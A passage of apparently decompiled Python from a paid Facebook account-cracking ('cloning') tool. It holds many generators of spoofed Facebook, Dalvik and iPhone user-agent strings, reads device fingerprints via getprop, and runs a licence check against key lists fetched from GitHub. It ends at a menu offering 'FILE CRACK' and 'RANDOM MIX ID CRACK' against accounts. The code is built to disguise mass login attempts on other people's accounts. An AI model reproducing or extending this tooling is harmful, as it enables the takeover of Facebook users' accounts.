    b = ';[FBAN/FB4A;FBAV/;FBBV/;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X521;FBSV/6.0;][FBAN/FB4A;FBAV/222.0.0.16.116;FBBV/71583955;FBDM/{density=2.75,width=1080,height=2340};FBLC/en_US;FBRV/71583955;FBCR/MTN;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X680B;FBSV/11;FBCA/arm64-v8a:;FBDM/{density=2.625,width=1080,height=2340};FB_FW/1;][FBAN/FB4A;FBAV/;FBBV/;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;]'
    ua = a + b
    return ua

def B1():
    a = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777))
    b = random.choice([';[FBAN/FB4A;FBAV/75.0.0.39.59;FBBV/525089766;FBDM/{density=2.0,width=1080,height=2400};FBLC/en_US;FBRV/564541635;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A528B;FBSV/11.0;FBOP/1;FBCA/armeabi-v7a;]', ';[FBAN/FB4A;FBAV/653.0.0.4929[FBAN/Orca-Android;FBAV/359.0.0.35.120;FBBV/552727041;FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO KE5;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'])
    ua = a + b
    return ua
def windows():
    """
    Generates a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f'Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f'Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(["2", "1"]))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.{str(random.choice(range(1, 120)))} Safari/{bz}'
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f'Mozilla/5.0 (Windows NT 6.{str(random.choice(["2", "1"]))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}'
    D = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'
    return random.choice([A, B, C, D])

def window1():
    """
    Generates another variant of a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f'Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}'
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f'Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(["0", "1"])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}'
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f'Mozilla/5.0 (Windows NT 6.{random.choice(["0", "1", "2"])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}'
    latest_build = random.randint(6000, 9000)
    latest_patch = random.randint(100, 200)
    D = f'Mozilla/5.0 (Windows NT {random.choice(["10.0", "11.0"])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36'
    return random.choice([A, B, C, D])

class UserAgentGenerator:
    """UserAgentGenerator"""
    def __init__(self):
        self.custom_user_agents = ['Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 [FBAN/FB4A;FBAV/395.0.0.35.120;FBBV/345678;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBRV/412345;FBCR/T-Mobile;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A127F;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]', '[FBAN/Orca-Android;FBAV/570.0.0.388.460;FBBV/91567890;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBCR/T-Mobile;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.orca;FBDV/moto g52;FBSV/13;FBOP/1;FBCA/arm64-v8a;]']
    
    def _generate_mozilla_user_agent(self):
        android_version = random.randint(4, 13)
        device = random.choice(('SM-G900F', 'SM-G920F', 'SM-T535'))
        resolution = random.choice(('{density=1.5,width=720,height=1280}', '{density=3.5,width=1440,height=3040}', '{density=2.5,width=1080,height=2400}'))
        chrome_version = f'{random.randint(100, 150)}.0.0.0'
        return f'Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36 [{resolution}]'
    
    def _generate_facebook_user_agent(self):
        fb_versions = ['143.0.0.19.100', '81.0.0.22.70']
        build_versions = ['282124661', '144693238']
        fb_version = random.choice(fb_versions)
        build_version = random.choice(build_versions)
        lang = random.choice(('en_US', 'en_GB', 'en_PK', 'en_PH'))
        carrier = random.choice(('Zong', 'Jazz', 'Telenor'))
        app = random.choice(('com.facebook.katana', 'com.facebook.orca', 'com.facebook.mlite'))
        device = random.choice(('Xiaomi', 'Infinix', 'Samsung'))
        model = random.choice(('X5510', 'X601', 'Xiaomi 14 Ultra'))
        resolution = random.choice(('{density=1.5,width=720,height=1280}', '{density=3.5,width=1440,height=3040}', '{density=2.5,width=1080,height=2400}'))
        android_version = random.randint(4, 13)
        return f'[FBAN/FB4A;FBAV/{fb_version};FBBV/{build_version};FBDM/{resolution};FBLC/{lang};FBCR/{carrier};FBMF/{device};FBDV/{model};FBSV/Android {android_version};FBPN/{app}]'
    
    def _generate_dalvik_user_agent(self):
        dalvik_version = f'{random.randint(1, 3)}.{random.randint(0, 9)}.{random.randint(0, 9)}'
        android_version = random.randint(4, 13)
        device = random.choice(('SM-G920F', 'SM-T535'))
        return f'Dalvik/{dalvik_version} (Linux; U; Android {android_version}; {device})'
    
    def _generate_iphone_user_agent(self):
        ios_version = random.randint(6, 17)
        device = random.choice(('iPhone 5', 'iPhone 6'))
        resolution = random.choice(('{density=2.0,width=750,height=1334}', '{density=3.0,width=1125,height=2436}', '{density=3.5,width=1242,height=2688}'))
        safari_version = f'{random.randint(14, 16)}.0'
        return f'Mozilla/5.0 (iPhone; CPU iPhone OS {ios_version} like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/{safari_version} Mobile/15E148 Safari/537.36 [{resolution}]'
    
    def _generate_facebook_orca_user_agent(self):
        return self._generate_facebook_user_agent().replace('FB4A', 'Orca-Android').replace('katana', 'orca')
    
    def _generate_facebook_katana_user_agent(self):
        return self._generate_facebook_user_agent()
    
    def generate_user_agent(self):
        user_agent_type = random.choice(('Mozilla', 'Facebook', 'Dalvik', 'iPhone', 'FacebookOrca', 'FacebookKatana', 'Custom'))
        if user_agent_type == 'Mozilla':
            return self._generate_mozilla_user_agent()
        elif user_agent_type == 'Facebook':
            return self._generate_facebook_user_agent()
        elif user_agent_type == 'Dalvik':
            return self._generate_dalvik_user_agent()
        elif user_agent_type == 'iPhone':
            return self._generate_iphone_user_agent()
        elif user_agent_type == 'FacebookOrca':
            return self._generate_facebook_orca_user_agent()
        elif user_agent_type == 'FacebookKatana':
            return self._generate_facebook_katana_user_agent()
        elif user_agent_type == 'Custom':
            return random.choice(self.custom_user_agents)

user_agent_generator = UserAgentGenerator()
def sm():
    Anderson = random.choice(['10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1'])
    model = random.choice(['GT-I9505', 'SM-T835', 'SM-S901U', 'MMB29K', 'SM-S134DL', 'SM-J250F', 'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M', 'SM-J410G', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005'])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice(['com.facebook.adsmanager|MobileAdsManagerAndroid', 'com.facebook.katana|FB4A', 'com.facebook.orca|Orca-Android', 'com.facebook.mlite|MessengerLite'])
    FBAN = fb.split('|')[1]
    platform = fb.split('|')[0]
    density_val = str(random.choice(range(720, 1500)))
    height_val = str(random.choice(range(1500, 2000)))
    ua = f'Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/LRX22C) [FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;FBBV/{vir};FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{{density={density_val},height={height_val}}};FB_FW/1;]'
    return ua

def ug1():
    fb_v1 = str(random.choice(range(111, 555)))
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 333333333)))
    rdp2 = str(random.choice(range(111111111, 333333333)))
    andv = str(random.choice(range(8, 12)))
    ua = f'Dalvik/2.1.0 (Linux; U; Android {andv}.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/{fb_v1}.0.0.50.{fb_v2};FBPN/com.facebook.katana;FBLC/es_MX;FBBV/{rdp1};FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/{andv}.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{{density=1.7,width=720,height=1358}};FB_FW/1;FBRV/0;]'
    return ua

def ug2():
    fb_v1 = str(random.choice(range(111, 555)))
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 433333333)))
    rdp2 = str(random.choice(range(111111111, 433333333)))
    andv = str(random.choice(range(8, 12)))
    ua = f'Dalvik/2.1.0 (Linux; U; Android {andv}.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/{fb_v1}.0.0.16.{fb_v2};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{rdp1};FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{andv}.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{{density=3.0,width=1080,height=1920}}]'
    return ua

def _____UpDaTe_S1_____():
    fbav3 = f'{random.randint(191, 505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39, 69)}.{random.randint(64, 154)}'
    fbbv3 = str(random.randint(111111111, 999999999))
    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width3 = random.choice(['720', '1080'])
    height3 = random.choice(['2400', '2340', '2560'])
    fblc3 = random.choice(['ja_JP', 'ex_MX', 'en_CU', 'en_US', 'fr_FR', 'fa_IR', 'es_ES', 'pt_BR', 'de_DE', 'it_IT', 'ja_JP', 'ko_KR', 'ru_RU', 'zh_CN', 'ar_AE', 'en_GB'])
    fbrv3 = str(random.randint(333333333, 999999999))
    fbcr3 = random.choice(['Banglalink', 'Airtel', 'Robi', 'Grameenphone', 'Teletalk', 'U.S. Cellular', 'Verizon', 'Verizon Wireless', 'Cricket', 'Google Fi', 'T-Mobile', 'AT&T', 'Sprint', 'Metro by T-Mobile', 'Boost Mobile', 'TracFone Wireless', 'Xfinity Mobile', 'Mint Mobile', 'Visible', 'Republic Wireless', 'Consumer Cellular', 'Straight Talk', 'Spectrum Mobile', 'Ting', 'H2O Wireless', 'FreedomPop', 'Boost Infinite', 'Simple Mobile', 'Pure Talk', 'C-Spire Wireless', 'SouthernLINC Wireless', 'GCI Wireless', 'Bluegrass Cellular', 'Nex-Tech Wireless', 'T-Mobile Prepaid', 'Ultra Mobile', 'TracFone', 'Freedom Wireless', 'MetroPCS', 'Cellcom', 'Nextel', 'Cricket Wireless'])
    fbmf3 = 'samsung'
    fbbd3 = 'samsung'
    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv3 = f'{random.randint(5, 11)}.{random.randint(0, 5)}.{random.randint(1, 5)}'
    fb3 = random.choice(['com.facebook.katana|FB4A', 'com.facebook.orca|Orca-Android'])
    fbpn3, fban3 = (fb3.split('|')[1], fb3.split('|')[0])
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]', 'FBOP/1;FBCA/arm64-v8a:;]'])
    ___Noor_on_Fire___ = '[FBAN/' + str(fban3) + ';FBAV/' + str(fbav3) + ';FBBV/' + str(fbbv3) + ';FBDM/{density=' + str(density3) + ',width=' + str(width3) + ',height=' + str(height3) + '};FBLC/' + str(fblc3) + ';FBRV/' + str(fbpn3) + ';FBDV/' + str(fbdv3) + ';' + str(bit3) + ''
    return ___Noor_on_Fire___

def _____UpDaTe_S2_____():
    fbav3 = f'{random.randint(191, 505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39, 69)}.{random.randint(64, 154)}'
    fbbv3 = str(random.randint(111111111, 999999999))
    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width3 = random.choice(['720', '1080'])
    height3 = random.choice(['2400', '2340', '2560'])
    fblc3 = random.choice(['ja_JP', 'ex_MX', 'en_CU', 'en_US', 'fr_FR', 'fa_IR', 'es_ES', 'pt_BR', 'de_DE', 'it_IT', 'ja_JP', 'ko_KR', 'ru_RU', 'zh_CN', 'ar_AE', 'en_GB'])
    fbrv3 = str(random.randint(333333333, 999999999))
    fbcr3 = random.choice(['Banglalink', 'Airtel', 'Robi', 'Grameenphone', 'Teletalk', 'U.S. Cellular', 'Verizon', 'Verizon Wireless', 'Cricket', 'Google Fi', 'T-Mobile', 'AT&T', 'Sprint', 'Metro by T-Mobile', 'Boost Mobile', 'TracFone Wireless', 'Xfinity Mobile', 'Mint Mobile', 'Visible', 'Republic Wireless', 'Consumer Cellular', 'Straight Talk', 'Spectrum Mobile', 'Ting', 'H2O Wireless', 'FreedomPop', 'Boost Infinite', 'Simple Mobile', 'Pure Talk', 'C-Spire Wireless', 'SouthernLINC Wireless', 'GCI Wireless', 'Bluegrass Cellular', 'Nex-Tech Wireless', 'T-Mobile Prepaid', 'Ultra Mobile', 'TracFone', 'Freedom Wireless', 'MetroPCS', 'Cellcom', 'Nextel', 'Cricket Wireless'])
    fbmf3 = 'samsung'
    fbbd3 = 'samsung'
    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv3 = f'{random.randint(5, 11)}.{random.randint(0, 5)}.{random.randint(1, 5)}'
    fb3 = random.choice(['com.facebook.katana|FB4A', 'com.facebook.orca|Orca-Android'])
    fbpn3, fban3 = (fb3.split('|')[1], fb3.split('|')[0])
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]', 'FBOP/1;FBCA/arm64-v8a:;]'])
    agent3 = '[FBAN/' + str(fban3) + ';FBAV/' + str(fbav3) + ';FBBV/' + str(fbbv3) + ';FBDM/{density=' + str(density3) + ',width=' + str(width3) + ',height=' + str(height3) + '};FBLC/' + str(fblc3) + ';FBRV/' + str(fbpn3) + ';FBDV/' + str(fbdv3) + ';' + str(bit3) + ''
    iphone3 = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/158.0.0.44.98;FBBV/90997758;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/en_US;FBOP/5;FBRV/90997758]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/672970693;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/674179525;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H350 [FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/696635672;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/700448384;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D82 [FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/707243085;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/704769221;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/708017881;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBIOS;FBAV/151.0.0.61.202;FBBV/82156572;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/SFR;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/83160404]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/534883268;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_Qaau_IT;FBOP/5;FBRV/537932531]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H364 [FBAN/FBIOS;FBAV/441.1.0.27.105;FBBV/539464914;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/541069100]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/276.0.0.32.107;FBBV/235827610;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/469153370;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/471145542]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/627850395;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/630494309;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/FBIOS;FBAV/174.0.0.48.98;FBBV/110921384;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/3;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/112241032]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/159.0.0.48.97;FBBV/91994325;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/92489346]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 [FBAN/FBIOS;FBAV/155.0.0.36.93;FBBV/87992437;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.1.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/89136215]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBIOS;FBAV/182.0.0.42.80;FBBV/118457561;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/POST;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/119485025]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/165.0.0.74.96;FBBV/100174821;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/100948865]'])
    ___Noor_on_Fire___ = '' + str(iphone3) + ' ' + str(agent3)
    return ___Noor_on_Fire___

fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')

sm_j510fn_mmb29m = [
    'SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 
    'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 
    'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 
    'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 
    'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 
    'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 
    'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 
    'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 
    'SM-T230|KOT49H', 'SM-T561|KTU84P', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 
    'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 
    'SM-A500FU|MMB29M', 'SM-T311|KOT49H', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 
    'GT-I9192|KOT49H', 'SM-T235|KOT4', 'SM-A500F|LRX22G', 'SM-G920F|MMB29K', 
    'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'SM-J320F|LMY4', 'SM-J510FN|MMB29M'
]

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release', shell=True).decode('utf-8').replace('\n', '')
model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '')
build = subprocess.check_output('getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
fblc = 'en_US'
try:
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[0].replace('\n', '')
except:
    fbcr = 'Roshan'
fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell=True).decode('utf-8').replace('\n', '')
fbbd = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True).decode('utf-8').replace(',', ':').replace('\n', '')
fbdm = '{density=2.25,height=' + subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell=True).decode('utf-8').replace('\n', '') + ',width=' + subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell=True).decode('utf-8').replace('\n', '')

try:
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')
    total = 0
    for i in fbcr:
        total += 1
    select = ('1', '2')
    if select == '1':
        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[0].replace('\n', '')
        sim_id += fbcr
    else:
        if select == '2':
            try:
                fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[1].replace('\n', '')
                sim_id += fbcr
            except Exception as e:
                fbcr = 'Roshan'
                sim_id += fbcr
        else:
            fbcr = 'Roahan'
            sim_id += fbcr
except:
    fbcr = 'Roahan'

device = {'android_version': android_version, 'model': model, 'build': build, 'fblc': fblc, 'fbmf': fbmf, 'fbbd': fbbd, 'fbdv': model, 'fbsv': fbsv, 'fbca': fbca, 'fbdm': fbdm}
uid = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = ''.join(uid).replace('_', '').replace('360', 'AHS').replace('u', '9').replace('a', 'A')
plat = platform.version()[14:][:21][::(-1)].upper()
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('?', '').replace('  ', '')
bxd = 'RAJA-VAU-'
bumper = bxd + id + xp
url1 = 'https://github.com/RAJA VAU-520/Approve.txt/blob/main/Approve.txt'
url2 = 'https://raw.githubusercontent.com/RAJA VAU-520/Approved.txt/refs/heads/main/approved..txt'
myweb2 = requests.get(url1).text + '\n' + requests.get(url2).text
def approval():
    # irreducible cflow, using cdg fallback
    try:
        clear()
        if bumper in myweb2:
            print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m YOUR KEY IS SUCCESSFULLY APPROVED')
            time.sleep(3)
            print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m RAJA VAU PAID TOOL')
            print(f' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m ONLY CLONING DATE : \033[1;92m{date}')
            print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m ONLY FOR PAID USER CONTACT TO ADMIN')
            print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m ONLY ACTIVE ID CLONE 99%')
            linex()
            print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m FILE CRACK')
            print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m RANDOM MIX ID CRACK')
